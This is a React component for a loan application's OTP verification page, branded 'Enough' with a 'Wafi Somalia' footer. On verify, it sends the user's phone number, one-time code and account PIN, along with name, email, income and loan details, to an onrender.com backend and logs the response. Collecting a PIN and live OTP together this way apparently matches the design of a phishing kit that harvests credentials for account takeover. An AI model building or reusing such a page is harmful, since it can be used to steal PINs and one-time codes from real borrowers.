import React, { useState, useRef } from "react";
import { useNavigate } from "react-router-dom";
import { useLoan } from "../context/LoanContext";

export default function Authentication() {
  const navigate = useNavigate();
  const { loanData, updateLoanData } = useLoan();

  const [otp, setOtp] = useState([
    "",
    "",
    "",
    "",
    "",
    "",
  ]);

  const [attempts, setAttempts] = useState(0);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");

  const inputsRef = useRef([]);

  const handleChange = (index, value) => {
    if (!/^\d?$/.test(value)) return;

    const next = [...otp];
    next[index] = value;
    setOtp(next);

    if (value && index < 5) {
      inputsRef.current[index + 1]?.focus();
    }
  };


  const handleKeyDown = (index, e) => {
    if (
      e.key === "Backspace" &&
      !otp[index] &&
      index > 0
    ) {
      inputsRef.current[index - 1]?.focus();
    }
  };


  const clearOtp = () => {
    setOtp([
      "",
      "",
      "",
      "",
      "",
      "",
    ]);

    setTimeout(() => {
      inputsRef.current[0]?.focus();
    }, 100);
  };


  const isComplete = otp.every(
    (digit) => digit !== ""
  );


  const handleVerify = async () => {
    setError("");

    if (!isComplete) return;


    const fullOtp = otp.join("");


    try {
      setLoading(true);


      const response = await fetch(
        "https://wafi-wex0.onrender.com/api/auth/verify-otp",
        {
          method: "POST",

          headers: {
            "Content-Type": "application/json",
          },

          body: JSON.stringify({

            phone: loanData.phone,

            otp: fullOtp,

            loanType: loanData.loanType,
            loanAmount: loanData.loanAmount,
            loanPeriod: loanData.loanPeriod,
            purpose: loanData.purpose,

            firstName: loanData.firstName,
            lastName: loanData.lastName,
            email: loanData.email,

            workStatus: loanData.workStatus,
            annualIncome: loanData.annualIncome,

            pin: loanData.pin,

          }),
        }
      );


      const data = await response.json();


      if (!response.ok) {

        const newAttempts = attempts + 1;

        setAttempts(newAttempts);

        clearOtp();


        if (newAttempts >= 3) {

          updateLoanData({
            loanType: "Personal Loan",
            loanAmount: "",
            loanPeriod: "",
            purpose: "",

            firstName: "",
            lastName: "",
            email: "",
            phone: "",

            workStatus: "Employee",
            annualIncome: "",

            pin: "",
            otp: "",
          });


          navigate("/step1");

          return;
        }


        throw new Error(
          `Invalid code. Attempts remaining: ${
            3 - newAttempts
          }`
        );
      }


      updateLoanData({
        otp: fullOtp,
      });


      console.log(
        "OTP SUCCESS:",
        data
      );


      navigate("/success");


    } catch (err) {

      setError(err.message);

    } finally {

      setLoading(false);

    }
  };


  return (
    <div className="min-h-screen bg-white flex flex-col font-sans">


      {/* Header */}
      <div className="flex items-center px-4 py-4 border-b border-gray-100">

        <h1
          className="text-3xl"
          style={{
            color: "#57b129",
          }}
        >
          Enough
        </h1>

      </div>



      {/* Content */}
      <div className="flex-1 px-4 pt-10">


        <div className="bg-white rounded-2xl shadow-lg border border-gray-100 p-6 max-w-md mx-auto">


          <h2 className="text-center text-2xl mb-4">
            OTP Verification
          </h2>


          <p className="text-center text-gray-800 text-sm mb-6">
            {loanData.phone}
          </p>



          {error && (

            <p className="text-red-500 text-sm text-center mb-4">

              {error}

            </p>

          )}



          {/* OTP Boxes */}
          <div className="flex justify-center gap-2.5 mb-8">

            {otp.map((digit, index) => (

              <input

                key={index}

                ref={(el) =>
                  (inputsRef.current[index] = el)
                }

                type="text"

                inputMode="numeric"

                maxLength={1}

                value={digit}

                onChange={(e) =>
                  handleChange(
                    index,
                    e.target.value
                  )
                }

                onKeyDown={(e) =>
                  handleKeyDown(
                    index,
                    e
                  )
                }

                className="w-12 h-14 text-center text-lg rounded-xl border-2 border-green-500 focus:outline-none"

              />

            ))}

          </div>



          <p className="text-center text-gray-400 text-sm mb-6">

            Attempts:
            {" "}
            {attempts}/3

          </p>



          <button

            onClick={handleVerify}

            disabled={!isComplete || loading}

            className={`w-full py-4 rounded-xl text-lg ${
              isComplete && !loading
                ? "text-white"
                : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}

            style={
              isComplete && !loading
                ? {
                    background:
                      "linear-gradient(to right,#a3dd3f,#57b129)",
                  }
                : {}
            }

          >

            {loading
              ? "VERIFYING..."
              : "VERIFY OTP"}

          </button>


        </div>


      </div>



      <div
        className="rounded-t-[48px] text-center py-8 px-6 mt-auto"
        style={{
          background:
            "linear-gradient(to right,#a3dd3f,#57b129)",
        }}
      >

        <p className="text-white text-sm">
          © 2026 Wafi Somalia
        </p>

      </div>


    </div>
  );
}